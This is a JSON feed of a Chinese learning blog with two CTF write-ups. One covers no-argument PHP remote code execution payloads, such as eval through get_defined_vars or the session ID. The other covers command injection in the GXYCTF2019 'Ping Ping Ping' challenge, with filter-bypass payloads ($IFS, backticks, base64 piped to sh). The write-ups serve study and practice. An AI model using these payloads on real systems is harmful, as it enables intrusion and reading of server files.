{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie • All posts by \"命令执行\" category",
    "description": "学习博客",
    "home_page_url": "http://git2740908911.gitee.io/fanqie.blog.io",
    "items": [
        {
            "id": "http://git2740908911.gitee.io/fanqie.blog.io/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "url": "http://git2740908911.gitee.io/fanqie.blog.io/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "title": "ctfweb-无参RCE",
            "date_published": "2021-08-13T10:49:41.433Z",
            "content_html": "<p>最近做题遇到了几道无参数 RCE 的题，基本上还是不会，在此总结一下 payload</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p><strong>常见提示：</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> $_GET<span class=\"token punctuation\">[</span><span class=\"token string\">'xxx'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有这种屏蔽的，一般都是无参数 rce：</p>\n<ul>\n<li>(?R) 引用当前表达式，后面加了？递归调用。允许执行类似 <code>a(b(c()))</code>  格式的无参数函数；</li>\n</ul>\n<hr>\n<p><strong>常见方法：</strong></p>\n<p>1.<em> 查看当前目录下的文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">#pos () 函数可以替换为 current () 函数，一个意思</span></pre></td></tr></table></figure><p>2.<em> 暴露出数组中文件的名字，方便用函数读取</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#原理就是随机生成键并反转，让名字暴露出来</span></pre></td></tr></table></figure><p>3.<em> 读取文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#都可以试试</span></pre></td></tr></table></figure><p>4.<em> 进行命令执行输入</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_defined_vars</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>get_defined_vars (void) ，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量等</li>\n<li>curren () ，用于初始指向插入到数组中的第一个单元。</li>\n<li>end ()，作用是将 array 的内部指针移动到最后一个单元并返回其值。</li>\n<li>然后 eval () 执行命令即可。</li>\n</ul>\n<p>5.<em> 用 http headers 头部的 session 的函数获取 flag</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>配合 burp 即可，把要执行的代码 16 进制后输入 phpsessid</p>\n<hr>\n<p>后续遇到新的再补充</p>\n<p>END</p>\n",
            "tags": [
                "RCE"
            ]
        },
        {
            "id": "http://git2740908911.gitee.io/fanqie.blog.io/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://git2740908911.gitee.io/fanqie.blog.io/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "(ctfwp)网站中linux命令执行",
            "date_published": "2021-07-27T13:45:24.931Z",
            "content_html": "<p>这类的题不算多，在这里稍微总结一下</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"gxyctf2019ping-ping-ping\"><a class=\"anchor\" href=\"#gxyctf2019ping-ping-ping\">#</a> [GXYCTF2019]Ping Ping Ping</h1>\n<p>第一次做这种题，有思路但缺少经验，所以没做出来，下面是 wp。</p>\n<p>进去界面什么都没有，只有  /?ip=</p>\n<p>查看源码无果，抓包无果，尝试输入 /?ip=1</p>\n<p>有结果 根据提示：ping</p>\n<p>考虑是 linux 命令，尝试查看目录  /?ip=1;ls</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/wk9qAWMTK8dtsyU.png\" alt=\"1.1.png\">&lt;!--p1--&gt;</p>\n<p>根据结果 cat flag.php，结果不让看，提示猜测应该是过滤了空格</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/bm2O53pIYcLjNzw.png\" alt=\"1.2.png\">&lt;!--p2--&gt;</p>\n<p>经过百度后，发现有以下几种绕过过滤空格的方式：</p>\n<blockquote>\n<ol>\n<li>${IFS} 替换</li>\n<li>$IFS$1 替换</li>\n<li>${IFS 替换</li>\n<li>%20 替换</li>\n<li>&lt;和 &lt;&gt; 重定向符替换</li>\n<li>%09 替换</li>\n</ol>\n</blockquote>\n<p>尝试第一种不行，<strong>(这里我提前做了下 FUZZ 测试，就不放图了，因为我看大佬都没用)</strong> 发现 {} 等等都被过滤了</p>\n<p>于是用第二种</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/gxF3pWdyJhYZwlc.png\" alt=\"1.3.png\">&lt;!--p3--&gt;</p>\n<p>发现 flag 被过滤了，查阅资料后，发现两张方式最合适。</p>\n<p><strong>第一种最常规：</strong>  命令执行拼接</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>a<span class=\"token operator\">=</span>g<span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1fla</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span>php</pre></td></tr></table></figure><p>原理就是 linux 命令的拼接，让 a=g，然后将 flag 换为 fla$a</p>\n<p><strong>第二种最牛逼：</strong>  内联绕过</p>\n<p>内联，就是将反引号内命令的输出作为输入执行。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1</span><span class=\"token string backtick-quoted-string\">`ls`</span></pre></td></tr></table></figure><p>ls 输出的内容直接被执行了</p>\n<p>flag 如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/27/OYtxEreBvki36Vm.png\" alt=\"1.4.png\">&lt;!--p4--&gt;</p>\n<hr>\n<p>另外我还学到了一些其他的方法，可能本题不适用，但也很常见。</p>\n<p><strong>单引号、双引号绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca\"t fl<span class=\"token string\">''</span>ag</pre></td></tr></table></figure><p><strong>反斜线绕过</strong>，本题被 ban 了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ca<span class=\"token punctuation\">\\</span>t fl<span class=\"token punctuation\">\\</span>ag</pre></td></tr></table></figure><p><strong>$1、$2 等和 $@绕过</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token variable\">$1at</span> gh<span class=\"token variable\">$@</span>twf01.txt</pre></td></tr></table></figure><p>如果<strong> cat 被过滤</strong>，可以用下边的方法进行绕过～～</p>\n<pre><code>(1)more:一页一页的显示档案内容\n\n(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页\n\n(3)head:查看头几行\n\n(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\n\n(5)tail:查看尾几行\n\n(6)nl：显示的时候，顺便输出行号\n\n(7)od:以二进制的方式读取档案内容\n\n(8)vi:一种编辑器，这个也可以查看\n\n(9)vim:一种编辑器，这个也可以查看\n\n(10)sort:可以查看\n\n(11)uniq:可以查看\n\n(12)file -f:报错出具体内容\n</code></pre>\n<hr>\n<p>本题还可以用</p>\n<p><strong>sh，bash 下编码</strong></p>\n<p>payload：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo$IFS$1Y2F0IGZsYWcucGhw<span class=\"token operator\">|</span>base64$IFS$<span class=\"token number\">1</span><span class=\"token operator\">-</span>d<span class=\"token operator\">|</span>sh</pre></td></tr></table></figure><p>Y2F0IGZsYWcucGhw 是 cat flag.php 的 base64 编码</p>\n<pre><code class=\"language-sh\">echo&quot;str&quot; | base64 -d\n将base64编码的字符串str+换行 解码输出\n</code></pre>\n<p>|sh 是以 sh 运行，不是 bash。</p>\n<p>具体参考下面这篇文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2VzbW8xOTg5L2FydGljbGUvZGV0YWlscy81MTA5MzQ4OQ==\">Linux base64 -- 用 base64 编解码</span></p>\n<hr>\n<p>另外，常见的管道符还有 <code>||</code>    <code> ;</code>   如果做不出来可以尝试下其他的。</p>\n<hr>\n<p>有新题我会补两道</p>\n<p>END</p>\n",
            "tags": [
                "命令执行"
            ]
        }
    ]
}